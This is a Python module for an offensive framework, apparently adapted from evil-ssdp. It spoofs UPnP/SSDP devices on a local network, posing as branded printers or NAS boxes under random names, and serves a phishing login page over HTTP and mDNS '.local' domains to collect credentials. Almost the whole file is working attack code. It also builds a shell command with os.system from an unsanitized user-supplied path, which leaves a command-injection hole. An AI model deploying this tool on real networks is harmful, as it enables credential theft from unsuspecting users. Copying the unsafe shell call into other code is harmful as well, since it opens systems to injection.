'''
ssdp_fake.py is based on functionality of evil-ssdp software
https://github.com/initstring/evil-ssdp/blob/master/LICENSE

MIT License

Copyright (c) 2018 InitString

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
'''

from termcolor import colored, cprint
from module import Module
from printib import *
import os, socket, struct, re, socketserver, http, random, uuid
import threading
from email.utils import formatdate
from multiprocessing import Process
from time import sleep
from otflib.mDNSssdpDiscovery import mDNSssdpDiscovery

class CustomModule(Module):
    def __init__(self):
        information = {
                    "Name"       : "ssdp_fake",
                    "Description": "This module emulates a UPnP device in the LAN with a phising login page",
                    "Author"     : "Guillermo Peñarando, Roberto Aranda"}

        options = {
                    "port"          : ["8008", "Port of the web server of the phising landing page", True],
                    "mDNS"          : ["True", "Start a mDNS server to resolve the landing page as a '.local' domain", False],
                    "path"          : [None, "Absolute path to a custom website folder that will be served as the device webpage", False],
                    "name"          : [None, "Device name. A random name is selected by default", False],
                    "manufacturer"  : [None, "Device manufacturer. A random manufacturer is selected by default", False],
                    "model"         : [None, "Device model. A random model is selected by default", False],
                    "domain"        : [None, "Domain name of the ladning page. The extension .local will be added automatically.", False],
                    "printer"       : ["False", "If this is setted to True the it will spoof a printer service instead a generic device", False]}

        # Constructor of the parent class
        super(CustomModule, self).__init__(information, options)

    # This module must be always implemented, it is called by the run option
    def run_module(self):

        def generate_xml(self, port):
            
            port = str(port)

            # Lists with all the curated names, manufacurers and models.
            FRIENDLYNAMES   = ["Zeus","Hera","Apollo","Odin","Ra","Achilles","Agni","Amaterasu","Anhur", "Anubis", "Ao Kuang", "Discordia","Fafnir","Ratatoskr"]
            MANUFACTURERS   = ["Microsoft", "Epson", "Synology", "Western Digital", "QNAP", "HP","Canon", "Brother"]
            MODELS          = ["One Drive","Shared Office Documents","Chromecast Audio", "Selphy CP1300", "i-Sensys MF643Cdw", "Brother MFCJ5330DW", "NAS WDBNFA0000NBK", "HP 6220", "HP 7830", "TS-431P"]
            DOMAINS         = ["epson","google","microsoft","webpage","sonos", "amazon", "apple", "pokemon", "beats"]

            # When user has set a value the associated variable takes that value. If not then a random value is selected for that variable.
            friendlyname    = random.choice(FRIENDLYNAMES) if (self.options["name"][0] == None)         else str(self.options["name"][0])
            manufacturer    = random.choice(MANUFACTURERS) if (self.options["manufacturer"][0] == None) else str(self.options["manufacturer"][0])
            model           = random.choice(MODELS)        if (self.options["model"][0] == None)        else str(self.options["model"][0])
            domain          = random.choice(DOMAINS)       if (self.options["domain"][0] == None)       else str(self.options["domain"][0])
            domain          = domain + ".local"
            is_printer      = True if (self.options["printer"][0] == "True" or self.options["printer"][0] == "true") else False
            urn1            = "urn:schemas-upnp-org:device:Basic:1" if (is_printer != True) else "urn:schemas-upnp-org:device:Printer:1"
            urn2            = "urn:schemas-upnp-org:device:Basic:1" if (is_printer != True) else "urn:schemas-upnp-org:service:PrintBasic:1"
            urn3            = "urn:schemas-upnp-org:device:Basic"   if (is_printer != True) else "urn:upnp-org:serviceId:1"
            rnd_uuid        = str(uuid.uuid4())

            # Set the path of the device webpage. Default is '/templates/ssdp/login/'
            user_path       = self.options["path"][0]
            if user_path == None:
                site_path = "/templates/ssdp/login/"
            elif os.path.isdir(user_path):
                user_path   = user_path[:-1] if (user_path[-1] == '/') else user_path
                dir_name    = user_path.split('/')[-1]
                site_path   = "/templates/ssdp/" + dir_name + "/"
                command = "cp -R " + user_path + " " + os.getcwd() + "/templates/ssdp/"
                os.system(command)
            else:
                print_error(f"The given path - {user_path} - is not valid. Default device webpage will be used")
                site_path = "/templates/ssdp/login/"

            xml = (
                '<?xml version="1.0"?>\r\n'
                '<root xmlns="urn:schemas-upnp-org:device-1-0">\r\n'
                    '\t<specVersion>\r\n'
                        '\t\t<major>1</major>\r\n'
                        '\t\t<minor>0</minor>\r\n'
                    '\t</specVersion>\r\n'
                    '\t<URLBase>http://'+domain+':'+port+'</URLBase>\r\n'
                    '\t<device>\r\n'
                        '\t\t<friendlyName>'+friendlyname+'</friendlyName>\r\n'
                        '\t\t<modelDescription>Connect to access</modelDescription>\r\n'
                        '\t\t<deviceType>'+urn1+'</deviceType>\r\n'
                        '\t\t<presentationURL>http://'+ domain + ':' + port + site_path + '</presentationURL>\r\n'
                        '\t\t<UDN>'+rnd_uuid+'</UDN>\r\n'
                        '\t\t<manufacturer>'+manufacturer+'</manufacturer>\r\n'
                        '\t\t<modelName>'+model+'</modelName>\r\n'
                        '\t\t<serviceList>\r\n'
                            '\t\t\t<service>\r\n'
                                '\t\t\t\t<serviceType>'+urn2+'</serviceType>\r\n'
                                '\t\t\t\t<serviceId>'+urn3+'</serviceId>\r\n'
                                '\t\t\t\t<controlURL>/ssdp/notfound</controlURL>\r\n'
                            '\t\t\t</service>\r\n'
                        '\t\t</serviceList>\r\n'
                    '\t</device>\r\n'
                '</root>')
            tfile = open('ssdp.xml', 'w+')
            tfile.write(xml)
            tfile.close()

        # This loop checks the incomming request and replies if the M-SEARCH header is present
        def searcher(local_ip, port, sock):
            while True:
                data, addr = sock.recvfrom(1024)
                received_st = re.findall(r'(?i)\\r\\nST:(.*?)\\r\\n', str(data))
                if 'M-SEARCH' in str(data) and received_st:
                    requested_st = received_st[0].strip()
                    date_format = formatdate(timeval=None, localtime=False, usegmt=True)
                    UUID = mDNSssdpDiscovery.get_uuid(None)
                    ssdp_reply = ('HTTP/1.1 200 OK\r\n'
                                'CACHE-CONTROL: max-age=1800\r\n'
                                'DATE: '+date_format+'\r\n'
                                'EXT:\r\n'
                                'LOCATION: http://'+local_ip+':'+ str(port) +'/ssdp.xml\r\n'
                                'OPT: "http://schemas.upnp.org/upnp/1/0/"; ns=01\r\n'
                                '01-NLS: '+UUID+'\r\n'
                                'SERVER: UPnP/1.0\r\n'
                                'ST: '+ requested_st +'\r\n'
                                'USN: '+UUID+'::'+ requested_st +'\r\n'
                                'BOOTID.UPNP.ORG: 0\r\n'
                                'CONFIGID.UPNP.ORG: 1\r\n'
                                '\r\n\r\n')
                    ssdp_reply = bytes(ssdp_reply, 'utf-8')
                    sock.sendto(ssdp_reply, addr)

        # This is the device webpage server.
        def web_server(port):
            try:
                with socketserver.TCPServer(("", port), http.server.SimpleHTTPRequestHandler) as httpd:
                    httpd.allow_reuse_address = True
                    httpd.serve_forever()
            except OSError:
                print_error("The specified port seems already occupied so the device webpage server can´t run.")

        def go(self, local_ip, port):

            generate_xml(self, port)
            sock    = mDNSssdpDiscovery.gen_socket(None)
            domain  = mDNSssdpDiscovery.get_domain(None)
            web     = mDNSssdpDiscovery.get_url(None)

            initialize_server   = Process(target=searcher, args=(local_ip, port, sock,))
            webserver           = Process(target=web_server, args=(port,))
            mdns_server         = Process(target=mDNSssdpDiscovery.mdns_server, args=(None,domain,))
            initialize_server.start()
            webserver.start()
            mdns_server.start()

            print_msg(
                'Server Started at: '+local_ip+':1900\n\n'
                '\txml location     : http://'+domain+':' + str(port)+ '/ssdp.xml\n'
                '\tDevice name      : '+mDNSssdpDiscovery.get_friendlyname(None)+'\n'
                '\tDevice webpage   : '+web+'\n'
                '\tService Spoofed  : '+mDNSssdpDiscovery.get_service(None)+'\n'
                '\nThis server will run in the background and requests will be printed until the job is killed\n',
                "cyan")
            t = threading.currentThread()
            while getattr(t, "do_run", True):
                sleep(1)
            print_msg("Stopping servers...", "blue")
            initialize_server.terminate()
            webserver.terminate()
            mdns_server.terminate()
            sleep(1)
            initialize_server.close()
            webserver.close()
            mdns_server.close()

        local_ip = [l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) if l][0][0]
        port = int(self.options["port"][0])
        thread1 = threading.Thread(target=go, args=(self, local_ip, port,))
        thread1.start()
        sleep(1)
        super(CustomModule, self).run(t=thread1)